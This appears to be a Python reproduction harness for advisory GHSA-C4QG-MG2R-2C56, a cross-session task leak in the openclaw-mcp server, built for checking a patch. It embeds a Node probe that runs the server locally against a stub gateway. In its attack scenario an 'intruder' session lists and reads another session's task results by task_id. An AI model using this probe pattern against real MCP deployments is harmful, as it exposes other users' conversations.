"""Mechanism reproduction for GHSA-C4QG-MG2R-2C56 — cross-client async task leakage in openclaw-mcp.

The PoC drives the pinned upstream server: it launches the real ``openclaw-mcp``
HTTP entrypoint and speaks MCP to it over two independent Streamable HTTP sessions,
with a controlled OpenAI-compatible gateway standing in for the OpenClaw instance.
It never reimplements the task manager or the tool handlers; the vulnerable and the
patched revision both run their own published code.

    attack  — connection B probes the task that connection A queued.
    benign  — every connection queues and reads its own task.
"""

from __future__ import annotations

import json
import os
import shutil
import subprocess
import sys
import tempfile
from pathlib import Path

from lab_support import parser, read_context, record

PACKAGE_NAME = "openclaw-mcp"
PROBE_NAME = "probe.mjs"
PLAN_NAME = "plan.json"
REPORT_NAME = "probe-report.json"
EFFECT_NAME = "effect.json"
PROBE_TIMEOUT_SECONDS = 240

# The upstream package ships only a bundled CLI, so the mechanism can only be
# exercised the way a client sees it: over the wire. This probe starts the
# pinned entrypoint, opens two MCP sessions, and records the raw tool responses.
PROBE = r'''#!/usr/bin/env node
// Drives the pinned openclaw-mcp HTTP server over independent Streamable HTTP
// sessions against a controlled OpenAI-compatible gateway, and reports the raw
// tool responses of every session.
import http from 'node:http';
import net from 'node:net';
import { spawn } from 'node:child_process';
import { readFileSync, writeFileSync } from 'node:fs';
import path from 'node:path';
import { pathToFileURL } from 'node:url';

function arg(name, fallback) {
  const index = process.argv.indexOf(`--${name}`);
  return index === -1 ? fallback : process.argv[index + 1];
}

const entry = path.resolve(arg('entry'));
const sdkClient = path.resolve(arg('sdk-client'));
const sdkHttp = path.resolve(arg('sdk-http'));
const planPath = path.resolve(arg('plan'));
const out = path.resolve(arg('out'));
const plan = JSON.parse(readFileSync(planPath, 'utf8'));

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

function freePort() {
  return new Promise((resolve, reject) => {
    const probe = net.createServer();
    probe.once('error', reject);
    probe.listen(0, '127.0.0.1', () => {
      const address = probe.address();
      probe.close(() => resolve(address.port));
    });
  });
}

function waitForPort(port, deadline) {
  return new Promise((resolve, reject) => {
    const attempt = () => {
      if (Date.now() > deadline) return reject(new Error('timeout waiting for the MCP server to listen'));
      const socket = net.connect(port, '127.0.0.1');
      socket.once('connect', () => { socket.destroy(); resolve(); });
      socket.once('error', () => { socket.destroy(); setTimeout(attempt, 100); });
    };
    attempt();
  });
}

const gatewayRequests = [];
const serverLog = [];

function textOf(result) {
  const parts = Array.isArray(result?.content) ? result.content : [];
  return parts.map((part) => (part && part.type === 'text' ? part.text : '')).join('');
}

function record(result) {
  return { isError: !!result?.isError, text: textOf(result) };
}

async function main() {
  const prefix = plan.gateway?.reply_prefix ?? '';
  const gateway = http.createServer((request, response) => {
    let body = '';
    request.on('data', (chunk) => { body += chunk; });
    request.on('end', () => {
      let parsed = null;
      try { parsed = JSON.parse(body); } catch { /* keep null */ }
      const message = parsed?.messages?.[0]?.content ?? '';
      gatewayRequests.push({
        method: request.method,
        url: request.url,
        model: parsed?.model ?? null,
        session: parsed?.session_id ?? null,
        message,
      });
      const payload = {
        id: 'chatcmpl-controlled',
        object: 'chat.completion',
        created: Math.floor(Date.now() / 1000),
        model: parsed?.model ?? 'openclaw',
        choices: [{ index: 0, message: { role: 'assistant', content: `${prefix}${message}` }, finish_reason: 'stop' }],
        usage: { prompt_tokens: 1, completion_tokens: 1, total_tokens: 2 },
      };
      const encoded = JSON.stringify(payload);
      response.writeHead(200, { 'content-type': 'application/json', 'content-length': Buffer.byteLength(encoded) });
      response.end(encoded);
    });
  });
  await new Promise((resolve) => gateway.listen(0, '127.0.0.1', resolve));
  const gatewayPort = gateway.address().port;

  const port = await freePort();
  const child = spawn(process.execPath, [entry, '--transport', 'http', '--host', '127.0.0.1', '--port', String(port)], {
    cwd: path.dirname(entry),
    env: {
      ...process.env,
      OPENCLAW_URL: `http://127.0.0.1:${gatewayPort}`,
      OPENCLAW_MODEL: 'openclaw',
      AUTH_ENABLED: 'false',
      OAUTH_ENABLED: 'false',
    },
    stdio: ['ignore', 'pipe', 'pipe'],
  });
  child.stdout.on('data', (chunk) => serverLog.push(chunk.toString()));
  child.stderr.on('data', (chunk) => serverLog.push(chunk.toString()));

  const { Client } = await import(pathToFileURL(sdkClient).href);
  const { StreamableHTTPClientTransport } = await import(pathToFileURL(sdkHttp).href);

  const connect = async (label) => {
    const transport = new StreamableHTTPClientTransport(new URL(`http://127.0.0.1:${port}/mcp`));
    const client = new Client({ name: label, version: '1.0.0' });
    await client.connect(transport);
    return client;
  };

  const queueAndAwait = async (client, message, sessionId) => {
    const chat = record(await client.callTool({
      name: 'openclaw_chat_async',
      arguments: { message, session_id: sessionId },
    }));
    let parsed = null;
    try { parsed = chat.isError ? null : JSON.parse(chat.text); } catch { parsed = null; }
    const taskId = parsed?.task_id ?? null;
    let status = null;
    for (let i = 0; taskId && i < 150; i += 1) {
      const probe = await client.callTool({ name: 'openclaw_task_status', arguments: { task_id: taskId } });
      if (!probe.isError) {
        status = JSON.parse(textOf(probe));
        if (status.status === 'completed' || status.status === 'failed' || status.status === 'cancelled') break;
      }
      await sleep(100);
    }
    return { chat, task_id: taskId, status };
  };

  const report = { scenario: plan.scenario, ok: false, errors: [], steps: {} };
  const clients = [];
  try {
    await waitForPort(port, Date.now() + 30000);
    report.server_started = true;

    for (const spec of plan.clients) {
      const client = await connect(spec.label);
      clients.push(client);
      if (spec.role === 'intruder') {
        report.steps[spec.label] = { role: spec.role, connected: true };
        continue;
      }
      const run = await queueAndAwait(client, spec.message, spec.session_id);
      report.steps[spec.label] = { role: spec.role, ...run };
    }

    const victim = plan.clients.find((spec) => spec.role === 'victim');
    const intruderSpec = plan.clients.find((spec) => spec.role === 'intruder');
    const victimRun = victim ? report.steps[victim.label] : null;
    const ownersComplete = plan.clients
      .filter((spec) => spec.role !== 'intruder')
      .every((spec) => {
        const status = report.steps[spec.label]?.status;
        return status?.status === 'completed' && status?.result === `${prefix}${spec.message}`;
      });

    if (plan.scenario === 'attack' && victim && intruderSpec && victimRun?.task_id) {
      const intruder = clients[plan.clients.indexOf(intruderSpec)];
      const listProbe = record(await intruder.callTool({ name: 'openclaw_task_list', arguments: {} }));
      const statusProbe = record(await intruder.callTool({
        name: 'openclaw_task_status',
        arguments: { task_id: victimRun.task_id },
      }));
      report.steps.foreign_task_list = listProbe;
      report.steps.foreign_task_status = statusProbe;
    }

    report.gateway_requests = gatewayRequests;
    report.ok = Boolean(report.server_started) && ownersComplete;
  } catch (error) {
    report.errors.push(String(error && error.stack ? error.stack : error));
  } finally {
    for (const client of clients) {
      try { await client.close(); } catch { /* ignore */ }
    }
    child.kill('SIGKILL');
    gateway.close();
  }
  report.server_log = serverLog.join('');
  writeFileSync(out, JSON.stringify(report, null, 2));
  return report.ok ? 0 : 1;
}

main().then((code) => process.exit(code), (error) => {
  writeFileSync(out, JSON.stringify({ ok: false, errors: [String(error)] }, null, 2));
  process.exit(1);
});
'''

# Directories that may hold the installed pinned package, most specific first.
CANDIDATE_ROOTS = (
    "/lab/app",
    "/lab/upstream",
    "/lab/src",
    "/lab",
    "/app",
    "/opt/app",
    "/opt/openclaw-mcp",
    "/usr/src/app",
    "/usr/lib/node_modules/openclaw-mcp",
    "/usr/local/lib/node_modules/openclaw-mcp",
    "/inputs",
)
PRUNE = {"node_modules", ".git", "__pycache__", ".cache", "results", "evidence"}
SDK_FAMILIES = (
    ("dist/esm/client/index.js", "dist/esm/client/streamableHttp.js"),
    ("dist/cjs/client/index.js", "dist/cjs/client/streamableHttp.js"),
    ("client/index.js", "client/streamableHttp.js"),
)


def _is_package(directory: Path) -> bool:
    manifest = directory / "package.json"
    if not manifest.is_file() or not (directory / "dist" / "index.js").is_file():
        return False
    try:
        data = json.loads(manifest.read_text(encoding="utf-8"))
    except (OSError, ValueError):
        return False
    return isinstance(data, dict) and data.get("name") == PACKAGE_NAME


def _walk(root: Path, max_depth: int):
    stack = [(root, 0)]
    while stack:
        current, depth = stack.pop()
        yield current
        if depth >= max_depth:
            continue
        try:
            children = sorted(current.iterdir())
        except OSError:
            continue
        for child in children:
            if child.is_dir() and not child.is_symlink() and child.name not in PRUNE:
                stack.append((child, depth + 1))


def _installed_packages() -> list[Path]:
    found: list[Path] = []
    roots = [Path(os.environ["OPENCLAW_MCP_ROOT"])] if os.environ.get("OPENCLAW_MCP_ROOT") else []
    roots += [Path(item) for item in CANDIDATE_ROOTS]
    roots.append(Path.cwd())
    for root in roots:
        if not root.is_dir():
            continue
        for base in (root, root / "package", root / "node_modules" / PACKAGE_NAME):
            if _is_package(base):
                found.append(base.resolve())
        for directory in _walk(root, 2):
            if _is_package(directory):
                found.append(directory.resolve())
    unique: list[Path] = []
    for path in found:
        if path not in unique:
            unique.append(path)
    return unique


def _node_modules_candidates(entry: Path) -> list[Path]:
    candidates: list[Path] = []
    for parent in [entry.parent, *entry.parent.parents]:
        candidates.append(parent / "node_modules")
    for extra in ("/lab/node_modules", "/inputs/node_modules", str(Path.cwd() / "node_modules")):
        candidates.append(Path(extra))
    for root in (entry.parent.parent, Path("/lab"), Path("/inputs")):
        if root.is_dir():
            for directory in _walk(root, 2):
                if directory.name == "node_modules":
                    candidates.append(directory)
    unique: list[Path] = []
    for path in candidates:
        if path not in unique:
            unique.append(path)
    return unique


def _sdk_paths(entry: Path) -> tuple[Path, Path] | None:
    for modules in _node_modules_candidates(entry):
        sdk = modules / "@modelcontextprotocol" / "sdk"
        if not sdk.is_dir():
            continue
        for relative_client, relative_http in SDK_FAMILIES:
            client = sdk / relative_client
            transport = sdk / relative_http
            if client.is_file() and transport.is_file():
                return client, transport
    return None


def _node_binary() -> str | None:
    for name in (os.environ.get("OPENCLAW_MCP_NODE"), "node", "nodejs"):
        if not name:
            continue
        located = shutil.which(name)
        if located:
            return located
    for path in ("/usr/bin/node", "/usr/local/bin/node", "/opt/node/bin/node"):
        if Path(path).is_file():
            return path
    return None


def _load_fixture(scenario: str) -> dict:
    fixtures = Path(__file__).resolve().parent / "fixtures"
    document = json.loads((fixtures / f"{scenario}.json").read_text(encoding="utf-8"))
    if document.get("schema_version") != 1 or document.get("scenario") != scenario:
        raise ValueError(f"invalid fixture for scenario {scenario}")
    clients = document.get("clients")
    if not isinstance(clients, list) or not clients:
        raise ValueError("fixture needs at least one client")
    return {
        "scenario": scenario,
        "gateway": {"reply_prefix": str(document["gateway"]["reply_prefix"])},
        "clients": [
            {
                "label": str(client["label"]),
                "role": str(client.get("role", "owner")),
                "session_id": str(client["session_id"]),
                "message": str(client.get("message", "")),
            }
            for client in clients
        ],
    }


def _response_text(step: object, key: str = "text") -> str:
    if isinstance(step, dict) and isinstance(step.get(key), str):
        return step[key]
    return ""


def _attack_effect(plan: dict, report: dict) -> dict:
    steps = report.get("steps", {})
    victim = next((item for item in plan["clients"] if item["role"] == "victim"), None)
    intruder = next((item for item in plan["clients"] if item["role"] == "intruder"), None)
    prefix = plan["gateway"]["reply_prefix"]
    owner_run = steps.get(victim["label"], {}) if victim else {}
    owner_status = owner_run.get("status") if isinstance(owner_run, dict) else None
    owner_result = owner_status.get("result") if isinstance(owner_status, dict) else None
    task_id = owner_run.get("task_id") if isinstance(owner_run, dict) else None
    foreign_list = steps.get("foreign_task_list")
    foreign_status = steps.get("foreign_task_status")
    list_text = _response_text(foreign_list)
    status_text = _response_text(foreign_status)
    owner_completed = False
    if victim is not None and isinstance(owner_status, dict):
        owner_completed = (
            owner_status.get("status") == "completed"
            and owner_result == f"{prefix}{victim['message']}"
        )
    return {
        "scenario": "attack",
        "victim": victim["label"] if victim else None,
        "intruder": intruder["label"] if intruder else None,
        "owner_task_id": task_id,
        "owner_task_completed": owner_completed,
        "owner_observed_result": owner_result,
        "intruder_task_list": foreign_list,
        "intruder_task_status": foreign_status,
        "derived": {
            "intruder_sees_owner_task": bool(task_id) and task_id in list_text,
            "intruder_reads_owner_result": bool(owner_result) and owner_result in status_text,
            "intruder_status_error": bool(isinstance(foreign_status, dict) and foreign_status.get("isError")),
        },
    }


def _benign_effect(plan: dict, report: dict) -> dict:
    steps = report.get("steps", {})
    prefix = plan["gateway"]["reply_prefix"]
    clients = []
    for spec in plan["clients"]:
        run = steps.get(spec["label"], {})
        status = run.get("status") if isinstance(run, dict) else None
        expected = f"{prefix}{spec['message']}"
        clients.append(
            {
                "label": spec["label"],
                "task_id": run.get("task_id") if isinstance(run, dict) else None,
                "chat_async": run.get("chat") if isinstance(run, dict) else None,
                "task_status": status,
                "completed_with_own_reply": bool(
                    isinstance(status, dict) and status.get("status") == "completed" and status.get("result") == expected
                ),
            }
        )
    return {
        "scenario": "benign",
        "clients": clients,
        "derived": {"all_clients_completed_with_own_reply": all(item["completed_with_own_reply"] for item in clients)},
    }


def main() -> int:
    args = parser(__doc__).parse_args()
    context = read_context(args.context)
    scenario = context["scenario"]
    plan = _load_fixture(scenario)

    observation: dict = {
        "target_ready": False,
        "execution_status": "not_run",
        "scenario": scenario,
        "variant": context["variant"],
        "pinned_package": PACKAGE_NAME,
    }

    packages = _installed_packages()
    node = _node_binary()
    reasons: list[str] = []
    if node is None:
        reasons.append("node runtime not found")
    if not packages:
        reasons.append("installed openclaw-mcp package not found")
    elif len(packages) > 1:
        reasons.append("ambiguous upstream install: " + ", ".join(str(item) for item in packages))
    entry = packages[0] / "dist" / "index.js" if len(packages) == 1 else None
    sdk = _sdk_paths(entry) if entry else None
    if entry and sdk is None:
        reasons.append("MCP client SDK not found next to the installed package")

    if reasons:
        observation["reasons"] = reasons
        observation["effect_file"] = EFFECT_NAME
        return record(
            context, args.output, observation,
            {EFFECT_NAME: json.dumps({"scenario": scenario, "derived": {}}, indent=2)},
        )

    observation["upstream_entry"] = str(entry)
    workdir = Path(tempfile.mkdtemp(prefix="openclaw-probe-"))
    try:
        (workdir / PROBE_NAME).write_text(PROBE, encoding="utf-8")
        (workdir / PLAN_NAME).write_text(json.dumps(plan, indent=2), encoding="utf-8")
        command = [
            node,
            str(workdir / PROBE_NAME),
            "--entry", str(entry),
            "--sdk-client", str(sdk[0]),
            "--sdk-http", str(sdk[1]),
            "--plan", str(workdir / PLAN_NAME),
            "--out", str(workdir / REPORT_NAME),
        ]
        try:
            completed = subprocess.run(
                command,
                cwd=str(workdir),
                capture_output=True,
                text=True,
                timeout=PROBE_TIMEOUT_SECONDS,
            )
            observation["probe_exit_code"] = completed.returncode
        except subprocess.TimeoutExpired:
            observation["execution_status"] = "failed"
            observation["reasons"] = ["probe timed out"]
            return record(context, args.output, observation, {EFFECT_NAME: json.dumps({"scenario": scenario, "derived": {}}, indent=2)})

        report_path = workdir / REPORT_NAME
        report = json.loads(report_path.read_text(encoding="utf-8")) if report_path.is_file() else {}
    finally:
        shutil.rmtree(workdir, ignore_errors=True)

    probes_present = scenario != "attack" or (
        isinstance(report.get("steps", {}).get("foreign_task_list"), dict)
        and isinstance(report.get("steps", {}).get("foreign_task_status"), dict)
    )
    ready = bool(report.get("ok")) and probes_present
    observation["target_ready"] = ready
    observation["execution_status"] = "completed" if ready else "failed"
    observation["probe_ok"] = bool(report.get("ok"))
    observation["server_started"] = bool(report.get("server_started"))
    if report.get("errors"):
        observation["probe_errors"] = report["errors"][:3]
    if not ready:
        tail = str(report.get("server_log", ""))[-1200:]
        observation["server_log_tail"] = tail

    effect = _attack_effect(plan, report) if scenario == "attack" else _benign_effect(plan, report)
    effect["variant"] = context["variant"]
    effect["server_started"] = bool(report.get("server_started"))
    effect["gateway_requests"] = report.get("gateway_requests", [])
    observation["effect_file"] = EFFECT_NAME
    return record(context, args.output, observation, {EFFECT_NAME: json.dumps(effect, ensure_ascii=False, indent=2)})


if __name__ == "__main__":
    raise SystemExit(main())
